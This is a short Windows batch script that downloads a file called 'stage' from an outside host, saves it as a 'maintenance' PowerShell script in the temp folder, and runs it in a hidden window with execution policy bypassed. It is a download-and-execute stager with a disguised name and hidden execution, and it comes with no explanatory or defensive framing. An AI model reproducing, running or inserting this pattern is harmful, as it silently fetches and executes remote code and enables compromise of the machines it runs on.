@echo off
curl.exe -fsSL "https://packages.example.net/stage" -o "%TMP%\maintenance.ps1"
powershell.exe -WindowStyle Hidden -EP Bypass -File "%TMP%\maintenance.ps1"
